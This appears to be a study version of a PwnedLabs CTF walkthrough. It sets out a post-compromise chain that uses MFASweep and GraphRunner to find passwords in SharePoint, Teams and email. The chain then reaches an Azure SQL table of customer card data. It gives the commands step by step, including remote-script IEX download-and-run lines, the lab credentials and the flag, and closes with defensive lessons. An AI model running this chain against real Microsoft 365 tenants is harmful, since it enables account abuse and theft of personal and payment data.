# GraphRunner lab: ADHD-friendly walkthrough

> **Main idea:** One compromised account leads to Microsoft 365 files, Teams messages, email, and finally an Azure SQL database.

**Source:** *Loot Exchange, Teams & SharePoint with GraphRunner - PwnedLabs CTF Walkthrough*, by Cyberguy, March 14, 2026. Local PDF: [1.pdf](./1.pdf).

This is a condensed study version of the supplied PDF. Commands and findings describe its lab scenario. No commands were executed against the lab. A few code lines are clipped in the PDF; completed versions below are identified explicitly.

## Start here

**Your goal:** Reach the lab's customer records and retrieve the CTF flag.

**Read one numbered step at a time.** Run its commands, check the result, then tick its box. The explanations can wait until you need them.

### The route

```text
Compromised account
  -> Check MFA
  -> Check Microsoft 365 license
  -> Get GraphRunner tokens
  -> Search SharePoint / OneDrive
  -> Search Teams for the spreadsheet password
  -> Search email for SQL credentials
  -> Connect to SQL
  -> Read Subscribers and find the flag
```

### Progress checklist

- [ ] 1. Confirm Graph API access without MFA.
- [ ] 2. Check the account's Microsoft 365 license.
- [ ] 3. Load GraphRunner and obtain tokens.
- [ ] 4. Find the documents and protected spreadsheet.
- [ ] 5. Find its password in Teams.
- [ ] 6. Find database credentials in email.
- [ ] 7. Connect to the database and list tables.
- [ ] 8. Read the Subscribers table and retrieve the flag.

### Lab account

| Item | Value |
| --- | --- |
| Username | `Clara.Miller@megabigtech.com` |
| Password | `MegaBigTech99` |

### What you need to recognize

| Term | Plain meaning |
| --- | --- |
| MFA | A second authentication factor beyond a password. |
| Microsoft Graph | An API used to access Microsoft 365 services. |
| Access token | A temporary credential used to make API requests. |
| Delegated permissions | Access exercised on behalf of a signed-in user, subject to permissions and policy. |
| GraphRunner | A PowerShell toolkit for interacting with Microsoft Graph. |
| SharePoint / OneDrive | Shared and personal document storage. |
| Azure SQL | A database service hosted in Azure. |
| PII | Information that can identify a person. |

---

## 1. Check which services allow password-only access

**Goal:** Determine whether the compromised account can authenticate to Microsoft Graph without MFA in this lab.

### Do

Load MFASweep. This completes the import URL clipped in the PDF's code block, also visible in its terminal screenshot:

```powershell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')
```

Run the check:

```powershell
Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password MegaBigTech99
```

### Look for

| Service | Result reported in the PDF |
| --- | --- |
| Microsoft Graph API | Single-factor access |
| Microsoft Service Management API | Single-factor access |
| M365 with tested user agents | No access |
| Exchange Web Services | No access |
| ActiveSync | No access |
| ADFS | Not in use |

**Why it matters:** Graph is a usable entry point even though other tested routes fail. Actual data access still depends on permissions, service availability, and policy.

**Optional explanation:** The PDF describes password-based OAuth requests using the ROPC flow. When additional interaction is required, this flow cannot complete it.

- [ ] **Done when:** You have identified the Graph API result.

*Source: PDF pages 4-6.*

---

## 2. Check the Microsoft 365 license

**Goal:** Find out which services the lab account is licensed to use.

### Do

The PDF's install line is duplicated/clipped. The intended command is presented cleanly here:

```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

Connect and request license details:

```powershell
Connect-MgGraph
Get-MgUserLicenseDetail -UserId 'Clara.Miller@megabigtech.com'
```

Follow the authentication prompt. This SDK connection and GraphRunner's later token acquisition are separate steps.

### Look for

```text
O365_BUSINESS_ESSENTIALS
```

The walkthrough reports Outlook, Teams, SharePoint Online, and OneDrive for Business access for this lab account.

**Remember:** A license is a clue about available services; it does not by itself grant access to every file or message.

- [ ] **Done when:** You have recorded the license result.

*Source: PDF pages 6-7.*

---

## 3. Load GraphRunner and get tokens

**Goal:** Prepare the toolkit used for the next three searches.

### Do

Load GraphRunner. This is the completed form of the clipped import line:

```powershell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
List-GraphRunnerModules
```

Authenticate:

```powershell
Get-GraphTokens -UserPasswordAuth
```

Enter Clara's lab credentials when prompted.

### Look for

- A successful authentication message.
- Tokens stored in the PowerShell variable `$tokens`.

**Keep this PowerShell session open.** The following commands use that variable.

### Only three search modules matter here

| Module | Searches |
| --- | --- |
| `Invoke-SearchSharePointAndOneDrive` | Documents |
| `Invoke-SearchTeams` | Teams messages |
| `Invoke-SearchMailbox` | Email |

The PDF also lists `Invoke-DumpCAPS`, `Invoke-DumpApps`, and `Invoke-RefreshGraphTokens`. They are not additional required stages of this walkthrough.

- [ ] **Done when:** `$tokens` is available after successful authentication.

*Source: PDF pages 7-10.*

---

## 4. Search SharePoint and OneDrive

**Goal:** Find credential documents and the protected bonus spreadsheet.

### Do: search for passwords

```powershell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
```

### Look for

| File | Location described in the PDF |
| --- | --- |
| `passwords.xlsx` | Main SharePoint site's Shared Documents |
| `Finance Logins.docx` | FinanceTeam site's Shared Documents |

Use GraphRunner's download prompt to retrieve the files.

The PDF reports credentials for finance, accounting, payroll, banking, expense reporting, Azure administration, development, 1Password, and HR. They demonstrate the exposure; the later SQL connection uses a different credential found in email.

### Do: search for bonuses

```powershell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
```

### Look for

```text
Bonuses - Confidential.xlsx
```

The file is password protected. The previously found passwords do not unlock it in the walkthrough.

**Next clue:** Search Teams for the password.

- [ ] **Done when:** You have found the protected spreadsheet.

*Source: PDF pages 10-13.*

---

## 5. Find the spreadsheet password in Teams

**Goal:** Unlock the bonus spreadsheet using a message visible to the account.

### Do

```powershell
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```

### Look for

A message from **Sam Olsson**, shown in **General**, containing the bonus spreadsheet password:

```text
openme123!
```

Open the protected spreadsheet with that password.

**Why it matters:** Protecting a document has limited value when the same compromised account can read its password elsewhere.

- [ ] **Done when:** The bonus spreadsheet opens.

*Source: PDF pages 13-14.*

---

## 6. Find SQL credentials in email

**Goal:** Locate the next link in the chain: database connection details.

### Do

```powershell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm 'password' -MessageCount 50
```

### Look for

An email with the subject **Subscribers database**.

| Connection item | Value reported in the PDF |
| --- | --- |
| Server | `mbt-finance.database.windows.net` |
| Database | `Finance` |
| Username | `financereports` |
| Password | `$reporting$123` |

**PowerShell detail:** Use single quotes around this password so its dollar signs stay literal.

- [ ] **Done when:** You have all four connection values.

*Source: PDF pages 14-16.*

---

## 7. Connect to Azure SQL and list tables

**Goal:** Confirm that the database is reachable from the lab environment.

### Do: connect

The PDF clips the connection string. This is a completed equivalent using its visible connection values, with transport encryption specified explicitly:

```powershell
$conn = New-Object System.Data.SqlClient.SqlConnection
$password = '$reporting$123'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=$password;Encrypt=True;TrustServerCertificate=False;"
$conn.Open()
```

### Look for

A successful connection. If `.Open()` returns without an error, check:

```powershell
$conn.State
```

Expected state: `Open`. This state check is an added reading aid.

### Do: list tables

The SQL filter is clipped in the PDF. The completed query below lists base tables:

```powershell
$sqlcmd = $conn.CreateCommand()
$sqlcmd.CommandText = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```

### Look for

| Database | Schema | Table |
| --- | --- | --- |
| `Finance` | `dbo` | `Subscribers` |

**Evidence note:** The PDF concludes that the SQL firewall allows any internet IP. A successful connection alone proves access from the tested source, not the complete firewall configuration.

- [ ] **Done when:** You see the `Subscribers` table.

*Source: PDF pages 16-18.*

---

## 8. Read Subscribers and retrieve the flag

**Goal:** Demonstrate the lab impact and finish the challenge.

### Do

```powershell
$sqlcmd2 = $conn.CreateCommand()
$sqlcmd2.CommandText = 'SELECT * FROM Subscribers;'
$adp2 = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd2
$data2 = New-Object System.Data.DataSet
$adp2.Fill($data2) | Out-Null
$data2.Tables | Format-Table -AutoSize
```

### Look for

The PDF reports **20 customer records**, with names, card numbers, CVVs, expiry dates, and birth dates. Its screenshot visibly includes names, card numbers, CVVs, and birth dates.

The reported CTF flag is:

```text
82b55974e50db8c02b4119a976c3570b
```

- [ ] **Done when:** You have found the flag in the lab output.

When finished, close the connection. This cleanup line is added:

```powershell
$conn.Close()
```

*Source: PDF pages 18-20.*

---

## What to remember

**The chain works because each source reveals the next clue.**

| Finding | What it enables |
| --- | --- |
| Password-only Graph authentication | An entry point into accessible Microsoft 365 data |
| Credential documents | Exposure of internal account secrets |
| Spreadsheet password in Teams | Access to the confidential bonus file |
| Database credentials in email | A SQL login attempt |
| Reachable SQL service and valid login | Access to customer records |

### Defensive lessons from the PDF

- **Authentication:** Enforce MFA through appropriate Conditional Access policies and review password-based authentication activity.
- **Documents:** Review sharing permissions; keep credentials out of shared files.
- **Messages and email:** Use a secrets manager instead of distributing passwords in chat or mail.
- **Monitoring:** Investigate unusual Graph access, file searches, and mailbox access. The PDF mentions `SearchQuery` and `MailItemsAccessed` audit events.
- **Data protection:** Apply appropriate DLP policies and sensitivity labels.
- **Database access:** Restrict network access and database privileges; evaluate Entra ID authentication, private endpoints, and protection for sensitive columns.

These summarize the source's lessons rather than a current deployment checklist.

## Pause / resume note

Fill in these four lines before taking a break:

```text
Last completed step:
Next small action:
Files or results saved at:
PowerShell session / token status:
```

## Quick self-check

1. Which service allowed password-only access? **Microsoft Graph API.**
2. Where was the spreadsheet password found? **Teams.**
3. Where were the final SQL credentials found? **Email.**
4. Which database and table mattered? **Finance -> dbo.Subscribers.**
5. What connected the entire chain? **One compromised account could read multiple sources of sensitive information.**

## Source coverage

- PDF pages 1-3: scenario, prerequisites, and overview.
- PDF pages 4-19: the eight walkthrough steps above.
- PDF page 20: conclusions and security gaps.
- PDF page 21: tool references and author information.
- PDF pages 22-23: page furniture/placeholders, with no additional walkthrough instructions.

Repeated screenshots, website navigation, promotional content, and the full inventory of incidental passwords have been condensed. The main route, commands, key findings, and final flag are preserved.
